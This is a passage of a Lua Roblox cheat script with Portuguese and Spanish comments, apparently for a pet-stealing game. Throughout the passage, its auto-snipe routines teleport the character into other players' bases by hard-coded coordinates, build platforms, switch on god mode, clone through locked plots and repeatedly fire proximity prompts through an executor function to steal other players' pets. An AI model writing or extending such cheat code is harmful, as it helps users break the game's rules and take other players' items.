        local carpetPosAtHeight = Vector3.new(carpetPos.X, hrp.Position.Y, positionBehindPet.Z)
        hrp.CFrame = CFrame.new(carpetPosAtHeight) * facingRot
        task.wait(0.2)

        if not char.Parent or not hrp.Parent then finishTeleport(); return end

        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
        hrp.CFrame = CFrame.new(finalPos) * facingRot
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
    end

    task.wait(0.3)

    -- Skip clone se em cooldown — para na lateral da base
    if not isCloneOnCooldown() then
        instantClone()
        while _G.isCloning do task.wait() end
        instantClone()
        while _G.isCloning do task.wait() end
    end

    -- Equip Witch's Broom after cloning into base
    pcall(function()
        local broomChar = LocalPlayer.Character
        local broomHum = broomChar and broomChar:FindFirstChildOfClass("Humanoid")
        if broomHum then
            local broom =
                LocalPlayer.Backpack:FindFirstChild("Flying Carpet")
                or broomChar:FindFirstChild("Flying Carpet")
            if broom then
                broomHum:EquipTool(broom)
            end
        end
    end)
    -- Xi TP: kicks in right after the clone TP lands
    task.wait(0.15)
    do
        local xiChar = LocalPlayer.Character
        local xiHrp = xiChar and xiChar:FindFirstChild("HumanoidRootPart")
        local xiTargetPart = findAdorneeGlobal(targetPetData)
        if xiHrp and xiTargetPart then
            local verticalDiff = xiTargetPart.Position.Y - xiHrp.Position.Y
            if verticalDiff > 2 then
                local airPos = Vector3.new(xiTargetPart.Position.X, xiTargetPart.Position.Y - 8, xiTargetPart.Position.Z)
                local plat = Instance.new("Part")
                plat.Name = "XiTempPlatform"
                plat.Size = Vector3.new(3, 1, 3)
                plat.Position = airPos - Vector3.new(0, 5, 0)
                plat.Anchored = true
                plat.CanCollide = true
                plat.Transparency = 0.3
                plat.Parent = Workspace
                RunService.Heartbeat:Wait()
                for i = 1, 10 do
                    if not LocalPlayer:GetAttribute("Stealing") then
                        xiHrp.AssemblyLinearVelocity = Vector3.new(xiHrp.AssemblyLinearVelocity.X, 0, xiHrp.AssemblyLinearVelocity.Z)
                        xiHrp.CFrame = CFrame.new(airPos)
                        task.wait(0.05)
                    end
                end
                task.spawn(function()
                    local start = tick()
                    while tick() - start < 20 do
                        if LocalPlayer:GetAttribute("Stealing") then break end
                        task.wait(0.1)
                    end
                    plat:Destroy()
                end)
            else
                for i = 1, 10 do
                    if LocalPlayer:GetAttribute("Stealing") then break end
                    xiHrp.AssemblyLinearVelocity = Vector3.new(xiHrp.AssemblyLinearVelocity.X, 0, xiHrp.AssemblyLinearVelocity.Z)
                    if (xiHrp.Position - xiTargetPart.Position).Magnitude > 3 then
                        xiHrp.CFrame = CFrame.new(xiTargetPart.Position)
                        task.wait(0.05)
                    end
                    task.wait(0.05)
                end
            end
        end
    end
    -- Auto steal: dispara no target do TP (respeita selection)
    task.spawn(function()
        task.wait(0.05)
        do
            local sHrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if not sHrp then return end
            -- Busca o prompt do pet que foi alvo do TP
            local tgtPart = findAdorneeGlobal(targetPetData)
            if not tgtPart then return end
            for _ = 1, 20 do
                if LocalPlayer:GetAttribute("Stealing") then break end
                -- Procura prompt no podium do target específico
                local tgtPlot = Workspace:FindFirstChild("Plots") and Workspace.Plots:FindFirstChild(targetPetData.plot)
                if tgtPlot then
                    local pods = tgtPlot:FindFirstChild("AnimalPodiums")
                    if pods then
                        local pod = pods:FindFirstChild(tostring(targetPetData.slot))
                        if pod then
                            local sp = pod:FindFirstChild("Base") and pod.Base:FindFirstChild("Spawn")
                            if sp then
                                local att = sp:FindFirstChild("PromptAttachment")
                                local pr = att and att:FindFirstChildOfClass("ProximityPrompt")
                                if pr and pr.Enabled then
                                    pcall(function() if fireproximityprompt then fireproximityprompt(pr) end end)
                                end
                            end
                        end
                    end
                end
                task.wait(0.05)
            end
        end
    end)

    finishTeleport()
end
-- ══════════════════════════════════════════════════════════════════════════
-- ▸ FRONT TP · Helpers V1 importados EXATAMENTE do hub Logística ◂
-- ▸ (envoltos em do...end pra não estourar o limite de 200 locais do main chunk) ◂
-- ══════════════════════════════════════════════════════════════════════════
local runAutoSnipeFront
do
    local function waitSecondsHeartbeat(sec)
    local t = 0
    while t < sec do
        t += RunService.Heartbeat:Wait()
    end
end

local function waitUntilHeartbeat(predicate, timeoutSec)
    local t = 0
    while true do
        if predicate() then return true end
        local dt = RunService.Heartbeat:Wait()
        t += dt
        if timeoutSec and t >= timeoutSec then
            return false
        end
    end
end

local function getClosestBaseSign(brainrotPart)
    if not brainrotPart or not brainrotPart:IsA("BasePart") then return nil end

    local closestPart = nil
    local closestDist = math.huge

    for _, label in ipairs(Workspace:GetDescendants()) do
        if label:IsA("TextLabel") then
            local txt = tostring(label.Text or "")
            if txt ~= "" and txt:lower():find("base", 1, true) then
                local gui = label:FindFirstAncestorWhichIsA("SurfaceGui")
                if gui then
                    local part = gui.Adornee or gui.Parent
                    if part and part:IsA("BasePart") then
                        local dist = (part.Position - brainrotPart.Position).Magnitude
                        if dist < closestDist then
                            closestDist = dist
                            closestPart = part
                        end
                    end
                end
            end
        end
    end

    return closestPart
end

local function riseToY(hrp, targetY)
    if not hrp then return end
    local MAX_TIME = 3.0
    local start = os.clock()

    while hrp.Parent and hrp.Position.Y < targetY do
        local dist = targetY - hrp.Position.Y
        local speed = math.clamp(dist * 20, 280, 310)
        hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, speed, hrp.AssemblyLinearVelocity.Z)
        if os.clock() - start > MAX_TIME then
            break
        end
        RunService.Heartbeat:Wait()
    end

    hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, 0, hrp.AssemblyLinearVelocity.Z)
end

local function equipTpToolAndWait(hum)
    if not hum then return nil end

    local char = hum.Parent
    local toolName = Config.TpSettings.Tool or "Flying Carpet"
    local tool = LocalPlayer.Backpack:FindFirstChild(toolName) or (char and char:FindFirstChild(toolName))

    if tool then
        if tool.Parent ~= char then
            hum:EquipTool(tool)
        else
            hum:EquipTool(tool)
        end
        task.wait(0.02)
    end

    return tool
end

local function prepMiniTpTool(hum, hrp)
    if not hum or not hrp then return end

    local char = hum.Parent
    local toolName = Config.TpSettings.Tool or "Flying Carpet"
    local tool = LocalPlayer.Backpack:FindFirstChild(toolName) or (char and char:FindFirstChild(toolName))
    if not tool then return end

    -- En este punto ya debio venir equipado desde antes del TP general.
    -- Aqui no reequipamos ni esperamos 0.02 para no tocar el tramo de airpos/mini tp.
end

local function flatDistance(a, b)
    return (Vector3.new(a.X, 0, a.Z) - Vector3.new(b.X, 0, b.Z)).Magnitude
end

local TP_V2_MED_POINTS = {
    {name = "MED1", pos = Vector3.new(-410.65, -5.68, -46.10)},
    {name = "MED2", pos = Vector3.new(-410.91, -5.68, 168.89)},
}

local function getNearestTeleportV2MedPoint(fromPos)
    local bestPoint = nil
    local bestDist = math.huge

    for _, entry in ipairs(TP_V2_MED_POINTS) do
        local dist = flatDistance(fromPos, entry.pos)
        if dist < bestDist then
            bestDist = dist
            bestPoint = entry
        end
    end

    return bestPoint, bestDist
end

-- ══════════════════════════════════════════════════════════════════════════
-- ▸ FRONT TP · Lógica EXATA V1 importada do hub Logística ◂
-- ══════════════════════════════════════════════════════════════════════════
function runAutoSnipeFront()
    if State.isTpMoving then return end

    -- TP Delay: atrasa o início do TP (valor em ms)
    local tpDelay = tonumber(Config.TpSettings.TpDelay) or 0
    if tpDelay > 0 then task.wait(tpDelay / 1000) end

    -- TP After FPS: espera o FPS atingir o threshold antes de seguir
    if Config.TpSettings.TpAfterFps then
        local thr = tonumber(Config.TpSettings.FpsThreshold) or 60
        local t0  = tick()
        while getCurrentFps() < thr and tick() - t0 < 5 do task.wait() end
        local fpsWait = tonumber(Config.TpSettings.FpsWait) or 0
        if fpsWait > 0 then task.wait(fpsWait) end
    end

    if State.carpetSpeedEnabled then
        setCarpetSpeed(false)
        if _carpetStatusLabel then
            _carpetStatusLabel.Text = "OFF"
            _carpetStatusLabel.TextColor3 = Theme.Error
        end
    end

    local targetPetData = nil
    if Config.AutoTPPriority then
        local bestEntry = nil
        local cache = SharedState.AllAnimalsCache
        if cache and type(cache) == "table" then
            for _, pName in ipairs(PRIORITY_LIST) do
                local searchName = pName:lower()
                for _, a in ipairs(cache) do
                    if a and a.name and a.name:lower() == searchName and a.owner ~= LocalPlayer.Name then
                        bestEntry = a
                        break
                    end
                end
                if bestEntry then break end
            end
            if not bestEntry then
                for _, a in ipairs(cache) do
                    if a and a.owner ~= LocalPlayer.Name then
                        bestEntry = a
                        break
                    end
                end
            end
        end
        if bestEntry then
            targetPetData = bestEntry
        else
            if not SharedState.SelectedPetData then ShowNotification("ERROR","No target selected!"); return end
            targetPetData = SharedState.SelectedPetData.animalData
        end
    else
        if not SharedState.SelectedPetData then ShowNotification("ERROR","No target selected!"); return end
        targetPetData = SharedState.SelectedPetData.animalData
    end
    if not targetPetData then return end

    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChild("Humanoid")

    if not hrp or not hum or hum.Health <= 0 then return end

    State.isTpMoving = true
    isTpMoving = State.isTpMoving
    playFullScreenFlash()
    enableGodMode()

    local ok, err = pcall(function()

        local targetPart = findAdorneeGlobal(targetPetData)
        if not targetPart then
            error("targetPart nil")
        end

        local targetCF

        if targetPart:IsA("Attachment") then
            targetCF = targetPart.WorldCFrame
        elseif targetPart:IsA("BasePart") then
            targetCF = targetPart.CFrame
        else
            local okPivot, pivot = pcall(function()
                return targetPart:GetPivot()
            end)
            if okPivot then
                targetCF = pivot
            end
        end

        if not targetCF then
            error("targetCF nil")
        end

        local exactPos = targetPart.Position
        local carpetName = Config.TpSettings.Tool
        local carpet = LocalPlayer.Backpack:FindFirstChild(carpetName) or char:FindFirstChild(carpetName)
        local cloner = LocalPlayer.Backpack:FindFirstChild("Quantum Cloner") or char:FindFirstChild("Quantum Cloner")

        equipTpToolAndWait(hum)

        local isSecondFloor = exactPos.Y > 10

        local signPart = getClosestBaseSign(targetPart)
        if not signPart then
            error("signPart nil")
        end

        local signCF = signPart.CFrame
        local RIGHT = signCF.RightVector
        local LEFT = -RIGHT
        local FORWARD = signCF.LookVector
        local BACK = -signCF.LookVector

        local medPoint = getNearestTeleportV2MedPoint(hrp.Position)
        if not medPoint then
            error("normal tp MED point nil")
        end

        hrp.AssemblyLinearVelocity = Vector3.zero

        if hum and hum.Parent then
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
        end
        task.wait(0.01)

        if not hrp or not hrp.Parent then
            error("hrp lost during normal jump start")
        end

        hrp.CFrame = CFrame.new(-409, 23, hrp.Position.Z)
        task.wait(0.1)

        if not hrp or not hrp.Parent then
            error("hrp lost after normal jump reposition")
        end

        riseToY(hrp, 40)

        local tpPos
        if exactPos.Y <= 6.313370704650879 then
            local frontPoint = signPart.Position + (FORWARD * 20)
            local backPoint = signPart.Position + (BACK * 20)

            local myPos = hrp.Position
            local distFront = (Vector3.new(frontPoint.X, 0, frontPoint.Z) - Vector3.new(myPos.X, 0, myPos.Z)).Magnitude
            local distBack = (Vector3.new(backPoint.X, 0, backPoint.Z) - Vector3.new(myPos.X, 0, myPos.Z)).Magnitude

            local chosen = (distFront < distBack) and frontPoint or backPoint
            tpPos = Vector3.new(chosen.X, -4.8, chosen.Z)
        else
            local backPoint = signPart.Position + (BACK * 15)
            local frontPoint = signPart.Position + (FORWARD * 15)

            local myPos = hrp.Position
            local myFlat = Vector3.new(myPos.X, 0, myPos.Z)
            local distBack = (Vector3.new(backPoint.X, 0, backPoint.Z) - myFlat).Magnitude
            local distFront = (Vector3.new(frontPoint.X, 0, frontPoint.Z) - myFlat).Magnitude

            local chosen = (distBack < distFront) and backPoint or frontPoint
            tpPos = Vector3.new(chosen.X, signPart.Position.Y + 4, chosen.Z)
        end

        hrp.AssemblyLinearVelocity = Vector3.zero
        -- MOD GIRO: llegar al cartel ya mirando hacia LEFT, como TP V1 SUPER RAPIDO
        hrp.CFrame = CFrame.lookAt(tpPos, tpPos + LEFT)
        hrp.AssemblyLinearVelocity = Vector3.zero

        waitUntilHeartbeat(function()
            return hrp and hrp.Parent
                and (hrp.Position - tpPos).Magnitude <= 2
                and hum
                and hum.FloorMaterial ~= Enum.Material.Air
        end, 3.0)

        if isSecondFloor or not _G._isTargetPlotUnlocked(targetPetData.plot) then
            prepMiniTpTool(hum, hrp)

            waitSecondsHeartbeat(0.05) -- wait propio despues de llegar debajo/encima del cartel

            if isSecondFloor then
                hrp.AssemblyLinearVelocity = Vector3.zero
                -- MOD GIRO: ya llego girado; se conserva el mini TP exacto
                waitSecondsHeartbeat(0.01)

                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.CFrame = hrp.CFrame * CFrame.new(0, 0, -2.5)
                hrp.AssemblyLinearVelocity = Vector3.zero
            else
                hrp.AssemblyLinearVelocity = Vector3.zero
                -- MOD GIRO: ya llego girado; se conserva el wait y walkForward exactos
                hrp.AssemblyLinearVelocity = Vector3.zero
                waitSecondsHeartbeat(0.03)

                walkForward(0.15)
            end

            waitSecondsHeartbeat(0.07) -- segundo wait propio antes de seguir con clone/airpos/etc

            local miniPos = hrp.Position
            waitSecondsHeartbeat(0.01)

            -- VERIFICACION FUERTE V1 ANTES DEL CLON:
            -- confirma que el mini TP / walk previo se hizo y que el personaje SIGUE
            -- en esa posicion justo antes de activar Quantum Cloner.
            local stillAtMiniPos = waitUntilHeartbeat(function()
                return hrp and hrp.Parent and (hrp.Position - miniPos).Magnitude <= 2.0
            end, 0.75)

            if not stillAtMiniPos then
                error("moved away from mini TP position before clone")
            end

            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero

            instantClone()
            waitUntilHeartbeat(function()
                return hrp and hrp.Parent and ((hrp.Position - miniPos).Magnitude >= 0.35)
            end, 4.0)
            while _G.isCloning do task.wait() end
        end

        task.wait(0.15)

        equipTpToolAndWait(hum)

        local verticalDiff = targetPart.Position.Y - hrp.Position.Y

        if verticalDiff > 2 then
            local airPos = Vector3.new(targetPart.Position.X, targetPart.Position.Y - 8, targetPart.Position.Z)

            local plat = Instance.new("Part")
            plat.Name = "XiTempPlatform"
            plat.Size = Vector3.new(3, 1, 3)
            plat.Position = airPos - Vector3.new(0, 5, 0)
            plat.Color = Color3.new(1, 0, 0)
            plat.Material = Enum.Material.Neon
            plat.Anchored = true
            plat.CanCollide = true
            plat.Transparency = 0.3
            plat.Parent = Workspace

            RunService.Heartbeat:Wait()

            for i = 1, 10 do
                if not LocalPlayer:GetAttribute("Stealing") then
                    hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, 0, hrp.AssemblyLinearVelocity.Z)
                    hrp.CFrame = CFrame.new(airPos)
                    task.wait(0.05)
                end
            end

            task.spawn(function()
                local start = tick()
                while tick() - start < 20 do
                    if LocalPlayer:GetAttribute("Stealing") then break end
                    task.wait(0.1)
                end
                plat:Destroy()
            end)
        else
            for i = 1, 10 do
                if LocalPlayer:GetAttribute("Stealing") then break end
                hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, 0, hrp.AssemblyLinearVelocity.Z)
                if (hrp.Position - targetPart.Position).Magnitude > 3 then
                    hrp.CFrame = CFrame.new(targetPart.Position)
                    task.wait(0.05)
                end
                task.wait(0.05)
            end
        end
    end)

    if not ok then
        warn("runAutoSnipeFront error:", err)
    end

    State.isTpMoving = false
    isTpMoving = State.isTpMoving
    task.delay(0.5, disableGodMode)
end

-- Exposto pra Auto Mode (precisa do signPart pra calcular pontos frontais)
_G._getClosestBaseSign = getClosestBaseSign
end -- fim do bloco do...end que envolve helpers V1 + runAutoSnipeFront

-- ══════════════════════════════════════════════════════════════════════════
-- ▸ 2-SIDES TP · Lógica IMPORTADA do lefa.lua (escopo isolado com do...end) ◂
-- ══════════════════════════════════════════════════════════════════════════
do
    -- ── Bases ─────────────────────────────────────────────────────────────────
    -- Bases atualizadas com coordenadas reais
    local BASES_LOW_S2 = {
        [1]=Vector3.new(-485.19,-6.15, 194.93), [5]=Vector3.new(-335.23,-6.15, 194.93),
        [2]=Vector3.new(-485.19,-6.15,  88.21), [6]=Vector3.new(-335.23,-6.15, 138.95),
        [3]=Vector3.new(-485.19,-6.15, -18.85), [7]=Vector3.new(-335.23,-6.15,  32.11),
        [4]=Vector3.new(-484.64,-6.15, -74.87), [8]=Vector3.new(-335.23,-6.15, -74.80),
    }
    local BASES_LOW_ALT_S2 = {
        [1]=Vector3.new(-485.19,-6.15, 194.93), [5]=Vector3.new(-335.23,-6.15, 194.93), -- cantos: igual ao padrao
        [2]=Vector3.new(-485.19,-6.15, 138.95), [6]=Vector3.new(-335.23,-6.15,  88.21),
        [3]=Vector3.new(-485.19,-6.15,  32.11), [7]=Vector3.new(-335.23,-6.15, -18.85),
        [4]=Vector3.new(-484.64,-6.15, -74.87), [8]=Vector3.new(-335.23,-6.15, -74.80), -- cantos: igual ao padrao
    }
    local BASES_HIGH_S2 = {
        [1]=Vector3.new(-485.19, 13.8, 194.82), [5]=Vector3.new(-335.23, 13.8, 194.69),
        [2]=Vector3.new(-485.19, 13.8,  87.78), [6]=Vector3.new(-335.23, 13.8, 139.59),
        [3]=Vector3.new(-485.19, 13.8, -19.30), [7]=Vector3.new(-335.23, 13.8,  32.54),
        [4]=Vector3.new(-485.19, 13.8, -74.34), [8]=Vector3.new(-335.23, 13.8, -74.34),
    }
    local BASES_HIGH_ALT_S2 = {
        [1]=Vector3.new(-485.19, 13.8, 194.82), [5]=Vector3.new(-335.23, 13.8, 194.69), -- cantos: igual ao padrao
        [2]=Vector3.new(-485.19, 13.8, 139.49), [6]=Vector3.new(-335.23, 13.8,  87.78),
        [3]=Vector3.new(-485.19, 13.8,  32.54), [7]=Vector3.new(-335.23, 13.8, -19.30),
        [4]=Vector3.new(-485.19, 13.8, -74.34), [8]=Vector3.new(-335.23, 13.8, -74.34), -- cantos: igual ao padrao
    }
    local CLONE_POSITIONS_FLOOR_S2 = {
        Vector3.new(-476,-4,221), Vector3.new(-476,-4,114),
        Vector3.new(-476,-4,7),   Vector3.new(-476,-4,-100),
        Vector3.new(-342,-4,-100),Vector3.new(-342,-4,6),
        Vector3.new(-342,-4,114), Vector3.new(-342,-4,220)
    }
    local FACE_TARGETS_S2 = {
        Vector3.new(-519,-3,221), Vector3.new(-519,-3,114),
        Vector3.new(-518,-3,7),   Vector3.new(-519,-3,-100),
        Vector3.new(-301,-3,-100),Vector3.new(-301,-3,7),
        Vector3.new(-302,-3,114), Vector3.new(-300,-3,220)
    }

    local function getClosestBaseIdx_S2(pos)
        local closest, dist = 1, math.huge
        for i, basePos in pairs(BASES_LOW_S2) do
            local d = (Vector2.new(pos.X,pos.Z)-Vector2.new(basePos.X,basePos.Z)).Magnitude
            if d < dist then dist=d; closest=i end
        end
        return closest
    end

    -- ── Helper: localiza o Carpet fisico no mapa ─────────────────────────────
    -- Cache da ultima posicao X do carpet (usado como fallback quando o carpet
    -- e removido/substituido durante eventos como Cyber Event, Water Event, etc.)
    local _lastCarpetX_S2 = nil
    local _fakeCarpetCache_S2 = nil

    local function _extractPartFromCarpet_S2(carpet)
        if not carpet then return nil end
        if carpet:IsA("Model") then
            if carpet.PrimaryPart then return carpet.PrimaryPart end
            for _, c in ipairs(carpet:GetChildren()) do if c:IsA("BasePart") then return c end end
            -- Busca recursiva caso o modelo tenha sub-folders
            for _, d in ipairs(carpet:GetDescendants()) do if d:IsA("BasePart") then return d end end
        elseif carpet:IsA("BasePart") then
            return carpet
        end
        return nil
    end

    local function findFlyingCarpet_S2()
        local map = Workspace:FindFirstChild("Map")

        -- 1. Caminho padrao (funciona fora de eventos)
        if map then
            local carpet = map:FindFirstChild("Carpet")
            local part = _extractPartFromCarpet_S2(carpet)
            if part then
                _lastCarpetX_S2 = part.Position.X
                return part
            end
        end

        -- 2. Durante eventos o nome muda. Procura nomes conhecidos em Map e em
        --    pastas de evento (Events/Event/CyberEvent etc).
        local searchRoots = {}
        if map then table.insert(searchRoots, map) end
        for _, name in ipairs({"Events", "Event", "CyberEvent", "EventMap", "Temp", "Maps"}) do
            local f = Workspace:FindFirstChild(name)
            if f then table.insert(searchRoots, f) end
        end

        local altNames = {
            "CyberCarpet", "CyberConveyor", "CyberRoad", "GlitchCarpet",
            "Highway", "Road", "Conveyor", "RedCarpet", "Carpet"
        }
        for _, root in ipairs(searchRoots) do
            for _, n in ipairs(altNames) do
                local c = root:FindFirstChild(n)
                local part = _extractPartFromCarpet_S2(c)
                if part then
                    _lastCarpetX_S2 = part.Position.X
                    return part
                end
            end
        end

        -- 3. Busca por palavras-chave no nome (descendants) dentro dos roots
        for _, root in ipairs(searchRoots) do
            for _, desc in ipairs(root:GetDescendants()) do
                if desc:IsA("Model") or desc:IsA("BasePart") then
                    local lname = desc.Name:lower()
                    if lname:find("carpet") or lname:find("highway")
                       or lname == "conveyor" or lname == "cyberconveyor" then
                        local part = _extractPartFromCarpet_S2(desc)
                        if part then
                            _lastCarpetX_S2 = part.Position.X
                            return part
                        end
                    end
                end
            end
        end

        -- 4. Fallback: usa o X cacheado da ultima vez que o carpet foi encontrado,
        --    ou o centro do mapa (-410) como ultimo recurso. Cria/reusa uma part
        --    invisivel para servir de referencia posicional.
        local fallbackX = _lastCarpetX_S2 or -410
        if _fakeCarpetCache_S2 and _fakeCarpetCache_S2.Parent then
            _fakeCarpetCache_S2.Position = Vector3.new(fallbackX, 0, 0)
            return _fakeCarpetCache_S2
        end
        local fake = Instance.new("Part")
        fake.Name = "_CarpetFallbackRef"
        fake.Anchored = true
        fake.CanCollide = false
        fake.Transparency = 1
        fake.Size = Vector3.new(1, 1, 1)
        fake.Position = Vector3.new(fallbackX, 0, 0)
        fake.Parent = Workspace
        _fakeCarpetCache_S2 = fake
        return fake
    end

    -- Tenta achar e cachear a posicao do carpet logo no load do script,
    -- antes de qualquer evento iniciar
    task.spawn(function()
        for _ = 1, 30 do
            local p = (function()
                local m = Workspace:FindFirstChild("Map")
                if not m then return nil end
                local c = m:FindFirstChild("Carpet")
                return _extractPartFromCarpet_S2(c)
            end)()
            if p then _lastCarpetX_S2 = p.Position.X; return end
            task.wait(0.5)
        end
    end)

    local function findClaimModel_S2(podium)
        if not podium or not podium.Parent then return nil end
        local claim = podium:FindFirstChild("Claim")
        if claim and claim:IsA("Model") then
            if claim.PrimaryPart then return claim.PrimaryPart end
            for _, c in ipairs(claim:GetChildren()) do if c:IsA("BasePart") then return c end end
        end
        return nil
    end

    local function getTargetPodiumAndSafePosition_S2(animalData, fallbackPos)
        if not animalData or not animalData.plot then return nil, fallbackPos end
        local plots = Workspace:FindFirstChild("Plots")
        local plot = plots and plots:FindFirstChild(animalData.plot)
        local podiums = plot and plot:FindFirstChild("AnimalPodiums")
        if not podiums then return nil, fallbackPos end
        local safeName = (fallbackPos and fallbackPos.Y > 8.8) and "13" or "3"
        local safePod = podiums:FindFirstChild(safeName)
        local safeBase = safePod and safePod:FindFirstChild("Base")
        local safeSpawn = safeBase and safeBase:FindFirstChild("Spawn")
        return safePod, (safeSpawn and safeSpawn:IsA("BasePart") and safeSpawn.Position) or fallbackPos
    end

    local function runAutoSnipe2Sides()
        if State.isTpMoving then return end

        local targetPetData = nil
        local cache = SharedState.AllAnimalsCache
        if Config.AutoTPPriority then
            if cache and type(cache) == "table" then
                for _, pName in ipairs(PRIORITY_LIST) do
                    local searchName = pName:lower()
                    for _, a in ipairs(cache) do
                        if a and a.name and a.name:lower() == searchName and a.owner ~= LocalPlayer.Name then
                            targetPetData = a; break
                        end
                    end
                    if targetPetData then break end
                end
                if not targetPetData then
                    for _, a in ipairs(cache) do
                        if a and a.owner ~= LocalPlayer.Name then targetPetData = a; break end
                    end
                end
            end
        else
            if SharedState.SelectedPetData then
                targetPetData = SharedState.SelectedPetData.animalData
            end
        end
        if not targetPetData then return end

        local char = LocalPlayer.Character
        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
        local hum  = char and char:FindFirstChild("Humanoid")
        if not hrp or not hum or hum.Health <= 0 then return end

        State.isTpMoving = true

        local targetPart = findAdorneeGlobal(targetPetData)
        if not targetPart then State.isTpMoving = false; return end

        local exactPos   = targetPart.Position
        local carpetName = Config.TpSettings.Tool
        local carpet     = LocalPlayer.Backpack:FindFirstChild(carpetName) or char:FindFirstChild(carpetName)

        local isSecondFloor = exactPos.Y > 10
        local plotIndex = getClosestBaseIdx_S2(exactPos)
        local targetBasePos
        local isAlt = false  -- true = base alternativa, false = base padrao

        if isSecondFloor then
            local posStd = BASES_HIGH_S2[plotIndex]
            local posAlt = BASES_HIGH_ALT_S2[plotIndex]
            local dStd = (hrp.Position - posStd).Magnitude
            local dAlt = (hrp.Position - posAlt).Magnitude
            isAlt = dAlt < dStd
            targetBasePos = isAlt and posAlt or posStd
        else
            local posLow = BASES_LOW_S2[plotIndex]
            local posLowAlt = BASES_LOW_ALT_S2[plotIndex]
            local dLow    = (hrp.Position - posLow).Magnitude
            local dLowAlt = (hrp.Position - posLowAlt).Magnitude
            isAlt = dLowAlt < dLow
            targetBasePos = isAlt and posLowAlt or posLow
        end

        -- ── Direcao e rotacao (dinamica) ────────────────────────────────────────
        local targetPodium = getTargetPodiumAndSafePosition_S2(targetPetData, targetBasePos)
        local claimPart    = findClaimModel_S2(targetPodium)

        local directionToPet = targetBasePos - hrp.Position
        if directionToPet.Magnitude > 0 then
            directionToPet = Vector3.new(directionToPet.X, 0, directionToPet.Z).Unit
        else
            directionToPet = Vector3.new(0, 0, -1)
        end

        local dirBehind
        if claimPart then
            local df = claimPart.Position - targetBasePos
            if df.Magnitude > 0 then
                dirBehind = -Vector3.new(df.X, 0, df.Z).Unit
            else
                dirBehind = -directionToPet
            end
        else
            dirBehind = -directionToPet
        end

        -- Snap sempre para eixo Z (todas as bases olham Z+ ou Z-)
        dirBehind = Vector3.new(0, 0, dirBehind.Z >= 0 and 1 or -1)
        local faceDir   = -dirBehind
        local facingRot = CFrame.lookAt(Vector3.zero, faceDir)

        local behindPos = targetBasePos + (dirBehind * 3)
        local rpPre = RaycastParams.new()
        rpPre.FilterDescendantsInstances = {char}
        rpPre.FilterType = Enum.RaycastFilterType.Exclude
        local resPre = Workspace:Raycast(
            Vector3.new(behindPos.X, targetBasePos.Y + 10, behindPos.Z),
            Vector3.new(0, -1000, 0),
            rpPre
        )
        if not resPre then State.isTpMoving = false; return end
        local finalHeight = resPre.Position.Y + 5.5
        local finalPos    = Vector3.new(behindPos.X, finalHeight, behindPos.Z)

        hrp.CFrame = CFrame.new(hrp.Position) * facingRot

        if hrp.Position.Y > 25 and targetBasePos.Y > 25 then
            -- Ja esta em altitude alta: TP direto sem intermediario
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
            hrp.CFrame = CFrame.new(finalPos) * facingRot
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
        else
            -- Impulso + teleporte intermediario (logica do script hub)
            if carpet then hum:EquipTool(carpet) end
            if not char.Parent or not hrp.Parent then State.isTpMoving = false; return end
            -- Reaplicar facing apos equip (animacao do equip pode rotacionar o personagem)
            hrp.CFrame = CFrame.new(hrp.Position) * facingRot

            if hum and hum.Parent then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
            task.wait(0.01)
            if not char.Parent or not hrp.Parent then State.isTpMoving = false; return end
            hrp.CFrame = CFrame.new(hrp.Position.X, 50, hrp.Position.Z) * facingRot
            task.wait(0.06)
            if not char.Parent or not hrp.Parent then State.isTpMoving = false; return end

            local positionBehindPet = targetBasePos + (dirBehind * 18)
            local carpetPart = findFlyingCarpet_S2()
            if not carpetPart then State.isTpMoving = false; return end

            if not char.Parent or not hrp.Parent then State.isTpMoving = false; return end
            local carpetPosAtHeight = Vector3.new(carpetPart.Position.X, hrp.Position.Y, positionBehindPet.Z)
            hrp.CFrame = CFrame.new(carpetPosAtHeight) * facingRot
            task.wait(0.18)

            if not char.Parent or not hrp.Parent then State.isTpMoving = false; return end
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
            hrp.CFrame = CFrame.new(finalPos) * facingRot
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
        end

        if isSecondFloor then
            -- 2o andar: TP para base lateral + clone
            for i = 1, 10 do
                hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, 0, hrp.AssemblyLinearVelocity.Z)
                if (hrp.Position - targetBasePos).Magnitude > 3 then
                    hrp.CFrame = CFrame.new(targetBasePos, targetBasePos + faceDir)
                    task.wait(0.05)
                end
            end
            task.wait(0.05)
            do
                local newPos = hrp.Position + faceDir * 1
                hrp.CFrame = CFrame.new(newPos, newPos + faceDir)
            end
            task.wait(0.06)
            hum.AutoRotate = false
            instantClone()
            while _G.isCloning do task.wait() end
            hum.AutoRotate = true
        else
            local baseOpen = _G._isTargetPlotUnlocked(targetPetData.plot)
            if baseOpen then
                -- Base aberta: TP para area dos lasers (centro da base)
                local bestSpot = CLONE_POSITIONS_FLOOR_S2[1]
                local minDst = math.huge
                for _, v in ipairs(CLONE_POSITIONS_FLOOR_S2) do
                    local d = (targetPart.Position - v).Magnitude
                    if d < minDst then minDst = d; bestSpot = v end
                end
                for i = 1, 4 do
                    if (hrp.Position - bestSpot).Magnitude > 3 then
                        hrp.CFrame = CFrame.new(bestSpot)
                        task.wait(0.03)
                    end
                end
                -- Virar para o FACE_TARGET mais proximo
